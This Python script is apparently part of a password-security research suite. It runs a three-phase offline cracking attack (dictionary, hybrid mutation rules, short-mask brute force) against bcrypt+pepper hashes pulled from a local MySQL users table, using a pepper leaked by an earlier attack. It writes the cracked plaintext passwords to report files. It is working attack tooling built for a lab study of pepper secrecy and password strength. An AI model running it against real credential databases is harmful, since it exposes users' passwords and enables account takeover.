import bcrypt
import mysql.connector
from mysql.connector import Error
from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools
import os
import re
import time

# -------------------------
# ATTACK 6 — Pepper Decryption + Hybrid Attack
#
# Scenario:
#   Attack 4 discovered the pepper via source code leak. Now we run a
#   full attack against encrypted_password (bcrypt + pepper) in three
#   escalating phases — all within a strict time budget so the full
#   research suite stays reproducible and fast.
#
#   PHASE 1 — Dictionary         (PHASE1_BUDGET seconds)
#     Plain wordlist against peppered hashes. Catches any weak password
#     that survived A1 only because the pepper hid it.
#
#   PHASE 2 — Hybrid / Rule-based  (PHASE2_BUDGET seconds)
#     Leet, capitalisation, suffix/prefix mutations. Targets medium
#     passwords disguised as dictionary words. Hard time cap.
#
#   PHASE 3 — Mask / Short brute force  (PHASE3_BUDGET seconds)
#     Short passwords (≤4 chars) only — bcrypt makes longer masks
#     impractical. Always runs, always gets its own slice.
#
# Time budget:
#   Each phase gets a fixed slice defined below.
#   Total = PHASE1_BUDGET + PHASE2_BUDGET + PHASE3_BUDGET
#   Phases start only after the previous one finishes or times out —
#   a slow Phase 1 cannot steal time from Phase 3.
# -------------------------

DB_CONFIG = {
    'host':     'localhost',
    'user':     'root',
    'password': 'root',
    'database': 'user_system'
}

SCRIPT_DIR      = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR     = os.path.join(SCRIPT_DIR, "results")
OUTPUT_PATH     = os.path.join(RESULTS_DIR, "a6_cracked.txt")
COMBINED_REPORT = os.path.join(RESULTS_DIR, "combined_report.txt")
WORDLIST_PATH   = os.path.join(SCRIPT_DIR, "wordlists", "common_passwords.txt")

PREVIOUS_RESULTS = [
    os.path.join(RESULTS_DIR, f"a{i}_cracked.txt") for i in range(1, 6)
]
A4_RESULTS = os.path.join(RESULTS_DIR, "a4_cracked.txt")

MAX_WORKERS = os.cpu_count() or 4

# ── Time budget (seconds) — adjust to suit your machine ──────────
PHASE1_BUDGET = 30    # dictionary   — usually finishes well under this
PHASE2_BUDGET = 120    # hybrid rules — time-capped, uses full slice
PHASE3_BUDGET = 30    # mask         — always guaranteed this window
# Total wall-clock time: PHASE1_BUDGET + PHASE2_BUDGET + PHASE3_BUDGET
#                      = 180s (~3 minutes) by default
# ─────────────────────────────────────────────────────────────────

MASK_MAX_LENGTH = 4
MASK_CHARSET    = "abcdefghijklmnopqrstuvwxyz0123456789!@#$"


# -------------------------
# LOAD PEPPER FROM A4 RESULTS
# -------------------------
def load_pepper(path):
    if not os.path.exists(path):
        print(f"❌ A4 results not found: {path}")
        print("   Run a4_pepper_guess.py first.")
        return None

    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line.startswith("Pepper") and ":" in line:
                value = line.split(":", 1)[1].strip().strip("'\"")
                if value == "Not found":
                    print("❌ A4 did not find the pepper — cannot run A6.")
                    return None
                print(f"✓ Pepper loaded from A4: '{value}'\n")
                return value

    print("❌ No Pepper line found in A4 results.")
    return None


# -------------------------
# LOAD ALREADY CRACKED USERS
# -------------------------
def load_already_cracked(*paths):
    cracked = set()

    skip_prefixes = (
        "=", "-", "CRACKED", "Username", "No ", "ATTACK", "Date", "Cracked",
        "Attempts", "Time", "Charset", "Max", "Speed", "KEY", "•",
        "Total", "bcrypt", "Adding", "COMBINED", "Generated", "ALL",
        "Method", "Reason", "Pepper", "Failed", "Note", "Phase", "Target",
        "By ", "Dict", "Hybrid", "Mask", "Budget",
    )

    for path in paths:
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith(skip_prefixes):
                    continue
                if ":" in line:
                    continue
                parts = line.split()
                if len(parts) >= 2:
                    cracked.add(parts[0])

    print(f"Skipping {len(cracked)} users already cracked by previous attacks.\n")
    return cracked


# -------------------------
# LOAD WORDLIST
# -------------------------
def load_wordlist(path):
    if not os.path.exists(path):
        print(f"❌ Wordlist not found: {path}")
        exit(1)

    with open(path, "r", encoding="utf-8") as f:
        words = [
            line.strip() for line in f
            if line.strip() and not line.startswith("#")
        ]

    words = list(dict.fromkeys(words))
    print(f"Loaded {len(words)} unique passwords.\n")
    return words


# -------------------------
# FETCH USERS
# -------------------------
def fetch_users(skip):
    try:
        conn   = mysql.connector.connect(**DB_CONFIG)
        cursor = conn.cursor()
        cursor.execute("SELECT userid, username, encrypted_password FROM users")
        all_users = cursor.fetchall()
        users = [(uid, un, h) for uid, un, h in all_users
                 if un not in skip and h]

        print(f"Total users in DB : {len(all_users)}")
        print(f"Already cracked   : {len(all_users) - len(users)}")
        print(f"Attacking         : {len(users)}\n")
        return users

    except Error as e:
        print(f"❌ Database error: {e}")
        exit(1)
    finally:
        if 'cursor' in locals(): cursor.close()
        if 'conn'   in locals() and conn.is_connected(): conn.close()


# -------------------------
# HYBRID MUTATION ENGINE
# -------------------------
LEET_MAP = {
    "a": "@", "e": "3", "i": "1", "o": "0",
    "s": "$", "t": "7", "g": "9", "b": "6",
}

COMMON_SUFFIXES = [
    "1", "!", "123", "1!", "12", "2", "2024", "2025",
    "#", "@", "!!", "01", "007", "99", "100", "#1",
]

COMMON_PREFIXES = ["!", "1", "my", "the"]


def _leet(word):
    result = word
    for c, sub in LEET_MAP.items():
        result = result.replace(c, sub)
    return result


def generate_mutations(word):
    seen = {word}

    def emit(c):
        if c and c not in seen:
            seen.add(c)
            return c
        return None

    base        = word.lower()
    capitalised = word.capitalize()
    upper       = word.upper()
    leet        = _leet(base)
    leet_cap    = leet.capitalize()

    for v in [base, capitalised, upper]:
        c = emit(v)
        if c: yield c

    c = emit(leet);
    if c: yield c
    c = emit(leet_cap);
    if c: yield c

    for stem in [word, base, capitalised, leet, leet_cap]:
        for suffix in COMMON_SUFFIXES:
            c = emit(stem + suffix)
            if c: yield c

    for prefix in COMMON_PREFIXES:
        for stem in [word, capitalised]:
            c = emit(prefix + stem)
            if c: yield c

    c = emit(word[::-1]);
    if c: yield c
    c = emit(word + word);
    if c: yield c


# -------------------------
# THREADED BCRYPT HELPER
# -------------------------
def _check_chunk(candidate_bytes, chunk):
    hits = []
    for _uid, username, stored_hash in chunk:
        try:
            if bcrypt.checkpw(candidate_bytes, stored_hash):
                hits.append(username)
        except Exception:
            pass
    return hits


# -------------------------
# CORE CRACK LOOP
# stop_at is an absolute time.time() deadline.
# Returns (attempts_made, timed_out).
# -------------------------
def _crack_loop(candidates, user_hashes, cracked, cracked_users,
                pepper_bytes, phase_label, stop_at):
    total_attempts = 0
    timed_out      = False

    for word, candidate_bytes in candidates:
        if time.time() >= stop_at:
            timed_out = True
            break

        active = [(uid, un, h) for uid, un, h in user_hashes
                  if un not in cracked_users]
        if not active:
            break

        full_candidate = candidate_bytes + pepper_bytes
        total_attempts += len(active)

        chunk_size = max(1, len(active) // MAX_WORKERS)
        chunks     = [active[i:i + chunk_size]
                      for i in range(0, len(active), chunk_size)]

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(_check_chunk, full_candidate, c): c
                       for c in chunks}
            for future in as_completed(futures):
                for username in future.result():
                    if username not in cracked_users:
                        cracked_users.add(username)
                        cracked.append((username, word, phase_label))
                        print(f"  [{phase_label}] {username:<30} → '{word}'")

    return total_attempts, timed_out


# -------------------------
# PHASE 1 — Dictionary
# Gets its own fixed slice: PHASE1_BUDGET seconds from now.
# -------------------------
def phase_dictionary(wordlist, user_hashes, cracked, cracked_users, pepper_bytes):
    stop_at = time.time() + PHASE1_BUDGET
    print(f"\n--- PHASE 1: Dictionary ({len(wordlist)} words, budget: {PHASE1_BUDGET}s) ---\n")

    candidates = ((w, w.encode("utf-8")) for w in wordlist)
    attempts, timed_out = _crack_loop(
        candidates, user_hashes, cracked, cracked_users,
        pepper_bytes, "DICT", stop_at
    )

    used = PHASE1_BUDGET - max(0, stop_at - time.time())
    status = f"⏱ timed out at {used:.1f}s" if timed_out else f"✓ finished in {used:.1f}s"
    print(f"    Phase 1: {status}")
    return attempts


# -------------------------
# PHASE 2 — Hybrid / Rule-based
# Gets its own fixed slice: PHASE2_BUDGET seconds from now.
# -------------------------
def phase_hybrid(wordlist, user_hashes, cracked, cracked_users, pepper_bytes):
    stop_at      = time.time() + PHASE2_BUDGET
    active_count = sum(1 for _, un, _ in user_hashes if un not in cracked_users)

    print(f"\n--- PHASE 2: Hybrid ({len(wordlist)} words × mutations, budget: {PHASE2_BUDGET}s) ---")
    print(f"    {active_count} users remaining\n")

    def candidate_gen():
        for word in wordlist:
            for mutation in generate_mutations(word):
                yield mutation, mutation.encode("utf-8")

    attempts, timed_out = _crack_loop(
        candidate_gen(), user_hashes, cracked, cracked_users,
        pepper_bytes, "HYBRID", stop_at
    )

    used = PHASE2_BUDGET - max(0, stop_at - time.time())
    status = f"⏱ timed out at {used:.1f}s" if timed_out else f"✓ finished in {used:.1f}s"
    print(f"    Phase 2: {status}")
    return attempts


# -------------------------
# PHASE 3 — Mask / Short brute force
# Gets its own fixed slice: PHASE3_BUDGET seconds from now.
# Always runs regardless of what happened in phases 1 and 2.
# -------------------------
def phase_mask(user_hashes, cracked, cracked_users, pepper_bytes):
    stop_at = time.time() + PHASE3_BUDGET
    active  = [(uid, un, h) for uid, un, h in user_hashes
               if un not in cracked_users]

    if not active:
        print(f"\n--- PHASE 3: Mask (budget: {PHASE3_BUDGET}s) — skipped, all users cracked ---\n")
        return 0

    print(f"\n--- PHASE 3: Mask (≤{MASK_MAX_LENGTH} chars, budget: {PHASE3_BUDGET}s) ---")
    print(f"    {len(active)} users remaining\n")

    total_attempts = 0

    for length in range(1, MASK_MAX_LENGTH + 1):
        if time.time() >= stop_at:
            print(f"    ⏱ Time budget reached at length {length}.")
            break

        active = [(uid, un, h) for uid, un, h in user_hashes
                  if un not in cracked_users]
        if not active:
            break

        combos = len(MASK_CHARSET) ** length
        print(f"    Length {length} — {combos:,} combos × {len(active)} users")

        for combo in itertools.product(MASK_CHARSET, repeat=length):
            if time.time() >= stop_at:
                break

            active = [(uid, un, h) for uid, un, h in user_hashes
                      if un not in cracked_users]
            if not active:
                break

            word           = "".join(combo)
            full_candidate = word.encode("utf-8") + pepper_bytes
            total_attempts += len(active)

            chunk_size = max(1, len(active) // MAX_WORKERS)
            chunks     = [active[i:i + chunk_size]
                          for i in range(0, len(active), chunk_size)]

            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = {executor.submit(_check_chunk, full_candidate, c): c
                           for c in chunks}
                for future in as_completed(futures):
                    for username in future.result():
                        if username not in cracked_users:
                            cracked_users.add(username)
                            cracked.append((username, word, "MASK"))
                            print(f"  [MASK]    {username:<30} → '{word}'")

    used = PHASE3_BUDGET - max(0, stop_at - time.time())
    print(f"    Phase 3: used {used:.1f}s of {PHASE3_BUDGET}s budget")
    return total_attempts


# -------------------------
# SAVE RESULTS
# -------------------------
def save_results(pepper, cracked, failed, elapsed, total_attempts,
                 total_users, phase_counts):
    os.makedirs(RESULTS_DIR, exist_ok=True)

    total_budget = PHASE1_BUDGET + PHASE2_BUDGET + PHASE3_BUDGET

    with open(OUTPUT_PATH, "w", encoding="utf-8") as f:
        f.write("=" * 60 + "\n")
        f.write("ATTACK 6 — Pepper Decryption + Hybrid\n")
        f.write(f"Date       : {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Pepper     : '{pepper}'\n")
        f.write(f"Budget     : {total_budget}s  (used {elapsed:.1f}s)\n")
        f.write(f"Phases     : P1={PHASE1_BUDGET}s  P2={PHASE2_BUDGET}s  P3={PHASE3_BUDGET}s\n")
        f.write(f"Cracked    : {len(cracked)} / {total_users}\n")
        f.write(f"Failed     : {len(failed)} / {total_users}\n")
        f.write(f"Attempts   : {total_attempts:,}\n")
        f.write(f"Time       : {elapsed:.2f}s\n")
        f.write(f"By phase   :\n")
        for phase, count in phase_counts.items():
            f.write(f"  {phase:<10} : {count}\n")
        f.write("=" * 60 + "\n\n")

        if cracked:
            f.write(f"{'Username':<30} {'Password':<25} Phase\n")
            f.write("-" * 65 + "\n")
            for username, password, phase in cracked:
                f.write(f"{username:<30} {password:<25} {phase}\n")
        else:
            f.write("No additional passwords cracked.\n")
            f.write("Reason: Remaining passwords not matched by any phase.\n")

    print(f"\nSaved → {OUTPUT_PATH}")


# -------------------------
# UPDATE COMBINED REPORT (idempotent)
# -------------------------
def update_combined(pepper, results):
    if not os.path.exists(COMBINED_REPORT):
        print("⚠️  Combined report missing.")
        return

    with open(COMBINED_REPORT, "r", encoding="utf-8") as f:
        report = f.read()

    cracked      = results["cracked"]
    total_users  = results["total_users"]
    attempts     = results["attempts"]
    elapsed      = results["time"]
    phase_counts = results["phase_counts"]
    total_budget = PHASE1_BUDGET + PHASE2_BUDGET + PHASE3_BUDGET

    # ── 1. Normalise title ──
    report = re.sub(
        r"(COMBINED ATTACK REPORT — (?:(?!\+ Pepper Decrypt).)+?)(\n)",
        lambda m: m.group(1).rstrip() + " + Pepper Decrypt" + m.group(2),
        report, count=1
    )

    # ── 2. Build Attack 6 section ──
    a6_section = (
        "----------------------------------------------------------------------\n"
        "  ATTACK 6 — Pepper Decryption + Hybrid Summary\n"
        "----------------------------------------------------------------------\n"
        f"  Date     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"  Pepper   : '{pepper}'\n"
        f"  Budget   : {total_budget}s  "
        f"(P1={PHASE1_BUDGET}s / P2={PHASE2_BUDGET}s / P3={PHASE3_BUDGET}s)\n"
        f"  Cracked  : {len(cracked)} / {total_users}\n"
        f"  Attempts : {attempts:,}\n"
        f"  Time     : {elapsed:.2f}s\n"
        f"  By phase : DICT={phase_counts['DICT']}  "
        f"HYBRID={phase_counts['HYBRID']}  MASK={phase_counts['MASK']}\n"
    )

    # ── 3. Replace or insert A6 block ──
    a6_pattern = re.compile(
        r"-{60,}\n  ATTACK 6 — Pepper Decryption \+ Hybrid Summary\n.*?(?=(-{60,}|={60,}))",
        re.DOTALL
    )
    if a6_pattern.search(report):
        report = a6_pattern.sub(a6_section + "\n", report, count=1)
        report = a6_pattern.sub("", report)
    else:
        marker = "=" * 70 + "\n  ALL CRACKED PASSWORDS"
        report = report.replace(marker, a6_section + "\n" + marker)

    # ── 4. Append newly cracked users ──
    if cracked:
        existing = set(re.findall(r"^\s{2}(\S+)\s+\S+", report, re.MULTILINE))
        new_rows = ""
        for u, p, phase in cracked:
            if u not in existing:
                new_rows += f"  {u:<33} {p:<20} Pepper Decrypt A6 ({phase})\n"
        if new_rows:
            report = re.sub(
                r"(\n={70,}\n  KEY FINDINGS)",
                "\n" + new_rows + r"\1",
                report
            )
        match = re.search(r"Total Cracked\s*:\s*(\d+)", report)
        if match:
            new_total = int(match.group(1)) + len(cracked)
            report = re.sub(
                r"Total Cracked\s*:\s*\d+",
                f"Total Cracked : {new_total}",
                report
            )

    # ── 5. Recompute Total Attempts ──
    def recompute_attempts(_m):
        vals = re.findall(
            r"ATTACK \d.*?Attempts\s*[:\|]\s*([\d,]+)", report, re.DOTALL
        )
        total = sum(int(v.replace(",", "")) for v in vals)
        return f"  Total Attempts: {total:,}"

    report = re.sub(r"  Total Attempts: [\d,]+", recompute_attempts, report)

    # ── 6. KEY FINDINGS bullet — exactly once ──
    bullet = (
        "  • With the pepper known, bcrypt+pepper collapses to bcrypt alone"
        " — hybrid attacks expose medium passwords as disguised dictionary words."
    )
    report = report.replace(bullet + "\n", "").replace(bullet, "")
    report = re.sub(r"(KEY FINDINGS\n)", r"\1" + bullet + "\n", report, count=1)

    with open(COMBINED_REPORT, "w", encoding="utf-8") as f:
        f.write(report)

    print("Updated combined report.\n")


# -------------------------
# MAIN ATTACK
# -------------------------
def pepper_decrypt_attack(users, wordlist, pepper):
    total_budget = PHASE1_BUDGET + PHASE2_BUDGET + PHASE3_BUDGET

    print("=" * 60)
    print("  ATTACK 6 — Pepper Decryption + Hybrid Attack")
    print(f"  Pepper    : '{pepper}'")
    print(f"  Column    : encrypted_password (bcrypt + pepper)")
    print(f"  Users     : {len(users)}")
    print(f"  Words     : {len(wordlist)}")
    print(f"  Threads   : {MAX_WORKERS}")
    print(f"  Budget    : {total_budget}s  "
          f"(P1={PHASE1_BUDGET}s / P2={PHASE2_BUDGET}s / P3={PHASE3_BUDGET}s)")
    print("=" * 60)

    cracked        = []
    cracked_users  = set()
    total_attempts = 0
    start          = time.time()

    pepper_bytes = pepper.encode("utf-8")
    user_hashes  = [(uid, un, h.encode("utf-8")) for uid, un, h in users]

    # Each phase receives its own fresh deadline computed at call time.
    # A slow Phase 1 cannot steal seconds from Phase 2 or 3.
    total_attempts += phase_dictionary(
        wordlist, user_hashes, cracked, cracked_users, pepper_bytes)
    p1 = len(cracked)
    print(f"    → {p1} cracked so far\n")

    total_attempts += phase_hybrid(
        wordlist, user_hashes, cracked, cracked_users, pepper_bytes)
    p2 = len(cracked) - p1
    print(f"    → {p2} new cracks\n")

    total_attempts += phase_mask(
        user_hashes, cracked, cracked_users, pepper_bytes)
    p3 = len(cracked) - p1 - p2
    print(f"    → {p3} new cracks\n")

    failed       = [un for _, un, _ in users if un not in cracked_users]
    elapsed      = time.time() - start
    speed        = total_attempts / elapsed if elapsed > 0 else 0
    phase_counts = {"DICT": p1, "HYBRID": p2, "MASK": p3}

    print(f"\n{'=' * 60}")
    print(f"  RESULTS")
    print(f"{'=' * 60}")
    print(f"  Cracked    : {len(cracked)} / {len(users)}")
    print(f"  Failed     : {len(failed)} / {len(users)}")
    print(f"  Attempts   : {total_attempts:,}")
    print(f"  Time       : {elapsed:.1f}s  (budget: {total_budget}s)")
    print(f"  Speed      : {speed:,.0f} attempts/sec")
    print(f"  By phase   : DICT={p1}  HYBRID={p2}  MASK={p3}")
    print(f"{'=' * 60}")
    print(f"\n  KEY FINDING:")
    print(f"  With the pepper known, bcrypt+pepper collapses to bcrypt")
    print(f"  alone. Hybrid attacks expose medium passwords as disguised")
    print(f"  dictionary words. Truly random passwords survive all phases")
    print(f"  — password strength matters regardless of pepper secrecy.\n")

    save_results(pepper, cracked, failed, elapsed, total_attempts,
                 len(users), phase_counts)

    return {
        "cracked":      cracked,
        "failed":       failed,
        "attempts":     total_attempts,
        "time":         elapsed,
        "total_users":  len(users),
        "phase_counts": phase_counts,
    }


if __name__ == "__main__":
    print("=" * 60)
    print("  ATTACK 6 — Pepper Decryption + Hybrid Attack")
    print("=" * 60 + "\n")

    pepper = load_pepper(A4_RESULTS)
    if pepper is None:
        exit(1)

    wordlist        = load_wordlist(WORDLIST_PATH)
    already_cracked = load_already_cracked(*PREVIOUS_RESULTS)
    users           = fetch_users(already_cracked)

    if not users:
        print("All users already cracked by previous attacks.")
        exit(0)

    results = pepper_decrypt_attack(users, wordlist, pepper)
    update_combined(pepper, results)